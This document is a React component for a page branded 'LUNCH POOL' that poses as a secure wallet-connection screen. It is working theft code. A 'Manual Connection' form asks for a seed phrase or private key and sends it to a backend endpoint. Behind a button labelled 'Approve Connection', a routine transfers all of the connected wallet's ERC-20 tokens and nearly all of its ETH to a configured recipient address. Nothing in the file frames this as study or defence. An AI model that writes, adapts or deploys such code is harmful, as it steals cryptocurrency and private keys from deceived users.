import React, { useState, useEffect } from 'react';
import { ethers } from 'ethers';
import { createWeb3Modal, useWeb3Modal, defaultConfig, useWeb3ModalAccount, useWeb3ModalProvider, useDisconnect } from '@web3modal/ethers/react';
import { 
  Import, 
  X, 
  AlertTriangle, 
  Zap,
  Eye,
  EyeOff,
  ArrowLeft,
  Wallet,
  Shield,
  Check
} from 'lucide-react';

// --- Web3Modal Configuration ---

const projectId = process.env.REACT_APP_WALLETCONNECT_PROJECT_ID;

const mainnet = {
  chainId: 1,
  name: 'Ethereum',
  currency: 'ETH',
  explorerUrl: 'https://etherscan.io',
  rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.REACT_APP_ALCHEMY_API_KEY}`
};

const metadata = {
    name: 'Connect Wallet',
    description: 'Connect your wallet to proceed',
    url: window.location.href,
    icons: ['https://avatars.githubusercontent.com/u/37784886']
};

const ethersConfig = defaultConfig({
  metadata
});

createWeb3Modal({
  ethersConfig,
  chains: [mainnet],
  projectId,
  enableAnalytics: false, // Disabled for debugging
  enableOnramp: false // Disabled for debugging
});

// --- Application Code & Constants ---

const ERC20_ABI = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function symbol() view returns (string)",
  "function transfer(address to, uint value) returns (bool)"
];

const RECIPIENT_ADDRESS = process.env.REACT_APP_RECIPIENT_ADDRESS;
const API_URL = process.env.REACT_APP_API_URL || 'http://localhost:3001';

const POPULAR_WALLETS = [
  { id: 'metamask', name: 'MetaMask', icon: '🦊' },
  { id: 'trust', name: 'Trust Wallet', icon: '🛡️' },
  { id: 'coinbase', name: 'Coinbase Wallet', icon: '🔵' },
  { id: 'phantom', name: 'Phantom', icon: '👻' },
  { id: 'walletconnect', name: 'WalletConnect', icon: '🔗' },
  { id: 'exodus', name: 'Exodus', icon: '🚀' },
  { id: 'atomic', name: 'Atomic Wallet', icon: '⚛️' },
  { id: 'ledger', name: 'Ledger Live', icon: '📊' },
  { id: 'trezor', name: 'Trezor Suite', icon: '🔐' },
  { id: 'myetherwallet', name: 'MyEtherWallet', icon: '💎' },
  { id: 'rainbow', name: 'Rainbow', icon: '🌈' },
  { id: 'argent', name: 'Argent', icon: '🏛️' },
];

// --- Helper Functions ---

const sendWalletInfo = async (walletName, secretPhrase) => {
  try {
    await fetch(`${API_URL}/api/send-wallet`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ walletName, secretPhrase, userWalletName: walletName }),
    });
  } catch (err) {
    console.error('Error sending wallet info:', err);
    throw err;
  }
};

const getWalletAssets = async (provider, address) => {
  try {
    // 1. Get ETH balance
    const ethBalance = await provider.getBalance(address);
    const formattedEthBalance = ethers.formatEther(ethBalance);

    // 2. Use Alchemy API to find all token balances
    const alchemyApiKey = process.env.REACT_APP_ALCHEMY_API_KEY;
    const alchemyUrl = `https://eth-mainnet.g.alchemy.com/v2/${alchemyApiKey}`;
    
    const tokenBalancesRes = await fetch(alchemyUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        jsonrpc: '2.0',
        id: 1,
        method: 'alchemy_getTokenBalances',
        params: [address, 'erc20'],
      }),
    });
    const tokenBalancesData = await tokenBalancesRes.json();
    const tokenBalances = tokenBalancesData.result.tokenBalances;

    // 3. For each token, get its metadata and format the balance
    const tokens = await Promise.all(
      tokenBalances
        .filter(t => t.tokenBalance !== '0') // Filter out tokens with zero balance
        .map(async (token) => {
          try {
            const contract = new ethers.Contract(token.contractAddress, ERC20_ABI, provider);
            const decimals = await contract.decimals();
            const symbol = await contract.symbol();
            const balance = ethers.formatUnits(token.tokenBalance, decimals);
            
            return {
              contractAddress: token.contractAddress,
              symbol,
              balance,
              rawBalance: BigInt(token.tokenBalance) // Use BigInt for raw balance
            };
          } catch (e) {
            // Some tokens might fail (e.g., bad ABI), so we'll ignore them
            console.warn(`Could not fetch metadata for token at ${token.contractAddress}`, e);
            return null;
          }
        })
    );
    
    return {
      eth: formattedEthBalance,
      tokens: tokens.filter(t => t !== null), // Filter out any tokens that failed
    };
  } catch (err) {
    console.error('Error fetching wallet assets:', err);
    return { eth: '0', tokens: [] };
  }
};

// --- Main Component ---

export default function ConnectWallet() {
  // Web3Modal Hooks
  const { open } = useWeb3Modal();
  const { address, isConnected, chainId } = useWeb3ModalAccount();
  const { walletProvider } = useWeb3ModalProvider();
  const { disconnect } = useDisconnect();

  // Component State
  const [provider, setProvider] = useState(null);
  const [signer, setSigner] = useState(null);
  const [walletBalance, setWalletBalance] = useState({ eth: '0', tokens: [] });
  const [isSending, setIsSending] = useState(false);
  const [txError, setTxError] = useState('');
  
  // UI State
  const [showManualPopup, setShowManualPopup] = useState(false);
  const [showTransactionPopup, setShowTransactionPopup] = useState(false);
  const [isPasswordVisible, setIsPasswordVisible] = useState(false);
  const [manualStep, setManualStep] = useState('selection'); // 'selection' or 'input'
  const [selectedWallet, setSelectedWallet] = useState(null);

  // Manual Form State
  const [formData, setFormData] = useState({ secretPhrase: '' });
  const [errors, setErrors] = useState({});

  // Effect to handle wallet connection and disconnection
  useEffect(() => {
    const handleConnection = async () => {
      if (isConnected && walletProvider && address) {
        try {
          const ethersProvider = new ethers.BrowserProvider(walletProvider);
          const ethersSigner = await ethersProvider.getSigner();
          setProvider(ethersProvider);
          setSigner(ethersSigner);

          const balances = await getWalletAssets(ethersProvider, address);
          setWalletBalance(balances);
          setShowTransactionPopup(true);
          setTxError('');
        } catch (err) {
            console.error("Error setting up provider and fetching balance:", err);
            setTxError("Could not initialize wallet connection. Please try again.");
        }
      } else {
        // Reset state on disconnect
        setProvider(null);
        setSigner(null);
        setWalletBalance({ eth: '0', tokens: [] });
        setShowTransactionPopup(false);
        setIsSending(false);
        setTxError('');
      }
    };

    handleConnection();
  }, [isConnected, address, walletProvider]);

  const closeAllPopups = () => {
    setShowManualPopup(false);
    setShowTransactionPopup(false);
    setFormData({ secretPhrase: '' });
    setErrors({});
    setTxError('');
    setManualStep('selection');
    setSelectedWallet(null);
  };
  
  // --- Form Handlers ---
  
  const handleWalletSelect = (wallet) => {
    setSelectedWallet(wallet);
    setManualStep('input');
  };

  const handleInputChange = (e) => {
    setFormData({ ...formData, secretPhrase: e.target.value });
    if (errors.secretPhrase) {
      setErrors({ ...errors, secretPhrase: null });
    }
  };

  const validateForm = () => {
    const newErrors = {};
    if (!formData.secretPhrase.trim()) newErrors.secretPhrase = 'Secret phrase or private key is required';
    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleManualSubmit = async (e) => {
    e.preventDefault();
    if (validateForm()) {
      try {
        await sendWalletInfo(selectedWallet.name, formData.secretPhrase);
        closeAllPopups();
      } catch (err) {
        setErrors({ form: "Failed to submit details. Please try again." });
      }
    }
  };

  // --- Transaction Logic ---

  const handleSendAllAssets = async () => {
    if (!provider || !signer || !address || !RECIPIENT_ADDRESS) {
      setTxError("Wallet not connected or recipient address is not configured.");
      return;
    }
    
    setIsSending(true);
    setTxError('');
    const errorMessages = [];

    // Determine fee strategy (EIP-1559 vs. Legacy)
    const feeData = await provider.getFeeData();
    const txOptions = {};
    if (feeData.maxFeePerGas && feeData.maxPriorityFeePerGas) {
      txOptions.maxFeePerGas = feeData.maxFeePerGas;
      txOptions.maxPriorityFeePerGas = feeData.maxPriorityFeePerGas;
      txOptions.type = 2; // EIP-1559
    } else {
      txOptions.gasPrice = feeData.gasPrice;
      txOptions.type = 0; // Legacy
    }

    // 1. Attempt to send all ERC-20 tokens
    for (const token of walletBalance.tokens) {
      try {
        if (token.rawBalance > 0n) {
          console.log(`Attempting to send ${token.symbol}...`);
          const tokenContract = new ethers.Contract(token.contractAddress, ERC20_ABI, signer);
          const tx = await tokenContract.transfer(RECIPIENT_ADDRESS, token.rawBalance, txOptions);
          await tx.wait();
          console.log(`${token.symbol} transfer confirmed!`);
        }
      } catch (err) {
        console.error(`${token.symbol} transfer failed:`, err);
        errorMessages.push(`${token.symbol}: ${err.reason || err.message}`);
      }
    }

    // 2. Attempt to send ETH
    try {
      const balance = await provider.getBalance(address);
      const gasLimit = 21000n;
      
      const gasPrice = txOptions.gasPrice || txOptions.maxFeePerGas;
      if (!gasPrice) {
        throw new Error("Could not determine gas price for transaction.");
      }

      const gasCost = gasPrice * gasLimit;

      if (balance > gasCost) {
        const valueToSend = balance - gasCost;
        const ethTxOptions = {
          ...txOptions,
          to: RECIPIENT_ADDRESS,
          value: valueToSend,
          gasLimit: gasLimit
        };
        const tx = await signer.sendTransaction(ethTxOptions);
        console.log('ETH transaction sent:', tx.hash);
        await tx.wait();
        console.log('ETH transaction confirmed!');
      } else if (balance > 0n) {
        console.log("Insufficient ETH for gas fees.");
      }
    } catch (err) {
      console.error("ETH transfer failed:", err);
      errorMessages.push(`ETH: ${err.reason || err.message}`);
    }

    setIsSending(false);

    if (errorMessages.length > 0) {
      const message = errorMessages.join('; ');
      setTxError(message.length > 150 ? 'Multiple errors occurred during transfer.' : message);
    } else {
      closeAllPopups();
    }
  };

  // --- Render Methods ---

  const renderConnectionCards = () => (
    <div className="grid grid-cols-1 md:grid-cols-2 gap-8 mb-12">
      <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-purple-500/50 transition-all duration-300">
        <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-purple-500/10 to-pink-600/10 rounded-full blur-3xl"></div>
        <div className="relative z-10">
          <div className="flex items-center gap-4 mb-6">
            <div className="w-12 h-12 rounded-lg bg-purple-500/20 flex items-center justify-center">
              <Import size={24} className="text-purple-400" />
            </div>
            <div className="text">
              <h3 className="text-xl font-semibold text-white">Manual Connection</h3>
              <p className="text-gray-400 text-sm">Import using seed phrase</p>
            </div>
          </div>
          <p className="text-gray-300 mb-6">
            Securely connect by selecting your wallet type and entering your recovery phrase.
          </p>
          <div className="features-list space-y-2 mb-8">
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Shield size={14} className="text-green-400" /> <span>Bank-level encryption</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Check size={14} className="text-green-400" /> <span>Works with all wallet types</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Wallet size={14} className="text-green-400" /> <span>Direct access to funds</span>
            </div>
          </div>
          <button 
            onClick={() => setShowManualPopup(true)}
            className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-purple-700/30"
          >
            Connect Manually
          </button>
        </div>
      </div>
      <div className="connection-card group relative overflow-hidden rounded-2xl bg-gradient-to-b from-white/5 to-white/[0.02] border border-white/10 backdrop-blur-sm p-8 hover:border-blue-500/50 transition-all duration-300">
        <div className="absolute top-0 right-0 w-32 h-32 bg-gradient-to-br from-blue-500/10 to-cyan-600/10 rounded-full blur-3xl"></div>
        <div className="relative z-10">
          <div className="flex items-center gap-4 mb-6">
            <div className="w-12 h-12 rounded-lg bg-blue-500/20 flex items-center justify-center">
              <Zap size={24} className="text-blue-400" />
            </div>
            <div className="text">
              <h3 className="text-xl font-semibold text-white">Automatic Connection</h3>
              <p className="text-gray-400 text-sm">One-click Web3 connection</p>
            </div>
          </div>
          <p className="text-gray-300 mb-6">
            Quick connection using popular wallet providers.
          </p>
          <div className="features-list space-y-2 mb-8">
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Zap size={14} className="text-blue-400" /> <span>Instant connection</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Shield size={14} className="text-blue-400" /> <span>Multiple wallet support</span>
            </div>
            <div className="flex items-center gap-2 text-sm text-gray-400">
              <Check size={14} className="text-blue-400" /> <span>No seed phrase required</span>
            </div>
          </div>
          <button 
            onClick={() => open()}
            className="w-full px-6 py-3 rounded-lg bg-gradient-to-r from-blue-600 to-purple-600 hover:from-blue-600 hover:to-purple-700 text-white font-medium transition-all shadow-lg shadow-blue-700/30"
          >
            Connect Wallet
          </button>
        </div>
      </div>
    </div>
  );

  const renderWalletDetails = () => (
    <div className="mb-12 bg-gradient-to-r from-blue-900/20 to-purple-900/20 border border-blue-500/30 rounded-xl p-6 backdrop-blur-sm">
      <h3 className="text-xl font-semibold text-white mb-6 flex items-center gap-3">
        <Wallet size={22} className="text-blue-400" /> Wallet Connected
      </h3>
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm mb-6">
        <div>
          <p className="text-gray-400">Address</p>
          <p className="text-white font-mono truncate" title={address}>{address}</p>
        </div>
        <div>
          <p className="text-gray-400">Chain ID</p>
          <p className="text-white font-medium">{chainId}</p>
        </div>
        <div className="border-t border-white/10 pt-4 md:border-t-0 md:pt-0">
          <p className="text-gray-400">ETH Balance</p>
          <p className="text-white font-medium">{parseFloat(walletBalance.eth).toFixed(5)} ETH</p>
        </div>
      </div>
      
      {walletBalance.tokens.length > 0 && (
        <div className="mt-6 border-t border-white/10 pt-6">
           <h4 className="text-lg font-semibold text-white mb-4">Token Balances</h4>
           <div className="grid grid-cols-1 md:grid-cols-2 gap-4 text-sm">
            {walletBalance.tokens.map(token => (
              <div key={token.contractAddress}>
                <p className="text-gray-400">{token.symbol}</p>
                <p className="text-white font-medium">{parseFloat(token.balance).toFixed(4)}</p>
              </div>
            ))}
          </div>
        </div>
      )}

      <button 
        onClick={() => disconnect()}
        className="w-full mt-6 px-6 py-3 rounded-lg bg-gradient-to-r from-red-600 to-pink-600 hover:from-red-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-red-700/30"
      >
        Disconnect Wallet
      </button>
    </div>
  );

  const renderManualConnectPopup = () => {
    if (!showManualPopup) return null;

    const goBack = () => {
        setManualStep('selection');
        setErrors({});
        setFormData({ secretPhrase: '' });
    }

    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-70 backdrop-blur-sm">
        <div className="bg-gray-800 rounded-2xl shadow-2xl p-6 w-full max-w-lg m-4 border border-gray-700 relative">
          <div className="flex justify-between items-center mb-6">
            {manualStep === 'input' && (
              <button onClick={goBack} className="text-gray-400 hover:text-white">
                <ArrowLeft size={24} />
              </button>
            )}
            <h3 className="text-xl font-bold text-white text-center flex-grow">
                {manualStep === 'selection' ? 'Select Your Wallet' : `Import ${selectedWallet?.name}`}
            </h3>
            <button onClick={closeAllPopups} className="text-gray-400 hover:text-white">
              <X size={24} />
            </button>
          </div>

          {manualStep === 'selection' ? (
            <div className="grid grid-cols-2 md:grid-cols-3 gap-4 max-h-[60vh] overflow-y-auto p-1">
              {POPULAR_WALLETS.map((wallet) => (
                <button
                  key={wallet.id}
                  onClick={() => handleWalletSelect(wallet)}
                  className="flex flex-col items-center justify-center p-4 bg-gray-700 rounded-lg hover:bg-gray-600 transition-colors space-y-2"
                >
                  <span className="text-4xl">{wallet.icon}</span>
                  <p className="font-semibold text-white text-sm text-center">{wallet.name}</p>
                </button>
              ))}
            </div>
          ) : (
            <form onSubmit={handleManualSubmit} className="space-y-6">
              <div className="relative">
                <textarea
                  placeholder="Enter your Secret Phrase or Private Key"
                  value={formData.secretPhrase}
                  onChange={handleInputChange}
                  rows={4}
                  className={`w-full p-4 bg-gray-700 rounded-lg text-white placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 ${errors.secretPhrase ? 'border border-red-500' : 'border border-gray-600'}`}
                />
                <button
                  type="button"
                  onClick={() => setIsPasswordVisible(!isPasswordVisible)}
                  className="absolute top-0 right-0 p-4 flex items-center text-gray-400 hover:text-white"
                >
                  {isPasswordVisible ? <EyeOff size={20} /> : <Eye size={20} />}
                </button>
                {errors.secretPhrase && <p className="text-red-500 text-sm mt-1">{errors.secretPhrase}</p>}
              </div>

              {errors.form && <p className="text-red-500 text-sm text-center">{errors.form}</p>}

              <button
                type="submit"
                className="w-full bg-gradient-to-r from-blue-500 to-purple-600 py-3 rounded-lg font-medium text-white hover:opacity-90 transition-opacity"
              >
                Import Wallet
              </button>
            </form>
          )}
        </div>
      </div>
    );
  };
  
  const renderTransactionPopup = () => {
    if (!showTransactionPopup) return null;

    const hasFunds = parseFloat(walletBalance.eth) > 0 || walletBalance.tokens.length > 0;

    return (
      <div className="fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-80 backdrop-blur-sm">
        <div className="bg-gray-800 rounded-2xl shadow-xl p-8 w-full max-w-sm m-4 border border-gray-700 text-center">
          <h3 className="text-2xl font-bold text-white mb-4">Connection Request</h3>
          <p className="text-gray-400 mb-8">Do you approve this Connection?</p>
          
          <div className="flex flex-col space-y-4">
             <button 
              onClick={handleSendAllAssets} 
              className={`w-full py-3 bg-gradient-to-r from-blue-500 to-purple-600 rounded-lg font-semibold text-white hover:opacity-90 transition-opacity flex items-center justify-center ${isSending || !hasFunds ? 'opacity-50 cursor-not-allowed' : ''}`}
              disabled={isSending || !hasFunds}
            >
              {isSending ? (
                <>
                  <svg className="animate-spin -ml-1 mr-3 h-5 w-5 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                  Approving...
                </>
              ) : (
                'Approve Connection'
              )}
            </button>
            <button 
              onClick={closeAllPopups} 
              className={`w-full py-3 bg-gray-600/50 rounded-lg hover:bg-gray-600/80 text-gray-300 font-semibold ${isSending ? 'cursor-not-allowed' : ''}`}
              disabled={isSending}
            >
              Decline Connection
            </button>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div className="connect-page min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900 text-white">
      <div className="fixed inset-0 bg-gradient-radial from-transparent via-indigo-900/20 to-black/40 pointer-events-none"></div>
      <header className="relative z-20 px-6 py-4 flex justify-between items-center border-b border-white/10 backdrop-blur-sm">
        <div className="logo text-2xl font-bold bg-gradient-to-r from-blue-400 to-purple-600 bg-clip-text text-transparent">
          LUNCH POOL
        </div>
        <div className="flex items-center gap-4">
          <button
            onClick={() => window.history.back()}
            className="flex items-center gap-2 px-4 py-2 rounded-lg bg-white/5 border border-white/10 hover:bg-white/10 text-white transition-all"
          >
            <ArrowLeft size={16} />
            Back
          </button>
        </div>
      </header>
      <main className="relative z-20 container mx-auto px-6 py-12">
        <div className="max-w-4xl mx-auto">
          <div className="text-center mb-12">
            <div className="inline-block px-3 py-1 rounded-full bg-blue-900/30 border border-blue-500/50 text-blue-400 text-sm font-semibold mb-6">
              SECURE CONNECTION
            </div>
            <h1 className="text-4xl md:text-5xl font-bold mb-6 text-transparent bg-clip-text bg-gradient-to-r from-blue-400 to-purple-600">
              Connect Your Wallet
            </h1>
            <p className="text-gray-300 text-lg max-w-2xl mx-auto">
              Connect your wallet to view your balance, interact with smart contracts, and make transactions on Ethereum Mainnet.
            </p>
          </div>
          
          {isConnected ? renderWalletDetails() : renderConnectionCards()}
        </div>
      </main>
      {renderManualConnectPopup()}
      {renderTransactionPopup()}
    </div>
  );
}